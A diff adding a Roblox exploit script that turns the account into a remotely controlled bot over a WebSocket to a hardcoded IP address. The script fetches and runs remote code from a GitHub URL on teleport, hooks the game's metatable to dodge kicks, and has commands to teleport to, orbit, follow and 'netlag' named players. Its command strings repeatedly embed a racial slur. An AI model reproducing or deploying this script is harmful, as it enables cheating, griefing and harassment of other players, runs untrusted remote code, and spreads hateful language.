@@ -1,0 +1,181 @@
+setfpscap(7)
+game:GetService("RunService"):Set3dRenderingEnabled(false)
+wait()
+queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/lol-312/printhewwoworld/main/123",true))()]])
+wait()
+for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
+   v:Disable()
+end
+local ws = WebSocket.connect("ws://109.71.252.155:8080")
+ws:Send("connect:"..game.Players.LocalPlayer.Name)
+local RunService = game:GetService("RunService")
+game:GetService("RunService").Heartbeat:Connect(function()
+  if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit then
+        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
+    end
+end)
+for i,v in ipairs(game.workspace:GetDescendants()) do
+    if v.ClassName == "Seat" then v:Destroy() end
+end
+local id = nil
+
+ws.OnMessage:Connect(function(msg)
+    print(msg)
+    if msg:find("connectedwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
+        print("(+) Connected to websocket with id: "..msg:split(":")[2])
+        id = tonumber(msg:split(":")[2])
+   elseif msg:find("line_upwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
+    local parts = msg:split(" ")
+    local targetName = parts[#parts]:lower()
+    for i, v in pairs(game.Players:GetPlayers()) do
+        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
+            targetName = v
+            break
+        end
+    end
+
+    if type(targetName) == "string" then return end
+    local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
+    print(targetName.Name)
+    hrp.CFrame = targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(id * 3, 0, 2))
+    elseif msg:find("sendingmessageservicewefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
+             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(msg:split(":")[2]),"All")
+    elseif msg:find("killwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
+                  game.Players.LocalPlayer.Character.Humanoid.Health = -10191
+    elseif msg:find('speedwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
+                     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = msg:split(":")[3]
+                       elseif msg:find('movetowefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
+                       local parts = msg:split(" ")
+        local targetName = parts[#parts]:lower()
+            for i,v in pairs(game.Players:GetPlayers()) do
+                if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
+                    targetName = v
+                    break
+                end
+            end
+            
+            if type(targetName) == "string" then return end
+            game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame.Position)
+
+                elseif msg:find('Rejoinwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
+              game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+                elseif msg:find('netlagnwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
+               local parts = msg:split(" ")
+        local targetName = parts[#parts]:lower()
+            for i,v in pairs(game.Players:GetPlayers()) do
+                if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
+                    targetName = v
+                    break
+                end
+            end
+            
+            if type(targetName) == "string" then return end
+            local op = targetName.Name
+            print(op)
+            game:GetService('RunService').Heartbeat:connect(function()
+   for i, v in pairs(workspace[op]:GetDescendants()) do
+           if v:IsA("BasePart") then
+               sethiddenproperty(v, "NetworkIsSleeping", true)
+        end
+   end
+   
+end)
+elseif msg:find('jumpwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
+  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+elseif msg:find('orbitwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestart') then
+  print("(+) Starting orbit")
+        local parts = msg:split(" ")
+        local targetName = parts[4]:lower()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if v.Name:lower():match(targetName) or v.DisplayName:lower():match(targetName) then
+                targetName = v
+                break
+            end
+        end
+
+        if type(targetName) == "string" then
+            print(targetName)
+            print("(!) Invalid targetName")
+            return
+        end
+         targetPlayer = targetName
+         speed = tonumber(parts[5])
+         distance = tonumber(parts[6])
+local runService = game:GetService('RunService')
+        local localPlayer = game.Players.LocalPlayer
+        local localRoot = localPlayer.Character.HumanoidRootPart
+        local targetRoot = targetPlayer.Character.HumanoidRootPart
+
+        local spinTime = 0
+
+        isOrbiting = true -- Start the orbit loop
+
+        local spinCn = runService.Heartbeat:Connect(function(deltaTime)
+            if not isOrbiting then
+                return
+            end
+
+            spinTime = spinTime + deltaTime * speed
+
+            local targetPos = targetRoot.Position
+if targetPlayer.Character.Humanoid.Health <= 0 then
+    spinCn:Disconnect()
+    targetPlayer = nil
+            spinCn = nil
+            speed = nil -- Set to your desired initial speed value
+    distance = nil -- Set to your desired initial distance value
+        isOrbiting = false -- Stop the orbit loop
+end
+            local xOffset = math.sin(spinTime) * distance
+            local zOffset = math.cos(spinTime) * distance
+            localRoot.CFrame = CFrame.new(targetPos + Vector3.new(xOffset, 0, zOffset), targetPos)
+        end)
+
+    elseif msg:find('orbitwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestop') then
+        print("(+) Stopping orbit")
+    speed = nil -- Set to your desired initial speed value
+    distance = nil -- Set to your desired initial distance value
+    targetPlayer = nil
+        isOrbiting = false -- Stop the orbit loop
+
+        if spinCn then
+            spinCn:Disconnect()
+            spinCn = nil
+        end
+
+        print("(+) Orbit stopped")
+
+
+    end
+end)
+wait()
+local mt = getrawmetatable(game)
+local nm = mt.__namecall
+setreadonly(mt,false)
+mt.__namecall = newcclosure(function(self,...)
+    if getnamecallmethod() == 'Kick' or getnamecallmethod() == 'kick' then
+ game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+    end
+
+    return nm(self,...)
+end)
+wait()
+while true do
+    for _,x in next, game:GetService("Players"):GetPlayers() do
+        if x and x ~= game:GetService("Players").LocalPlayer and x.Character then
+            pcall(function()
+                for _,v in next, x.Character:GetChildren() do
+                    if v:IsA("BasePart") and v.CanCollide then
+                        v.CanCollide = false
+                        if v.Name == "Torso" then
+                            v.Massless = true
+                        end
+                        v.Velocity = Vector3.new()
+                        v.RotVelocity = Vector3.new()
+                    end
+                end
+            end)
+        end
+    end
+    game:GetService("RunService").Stepped:wait()
+end
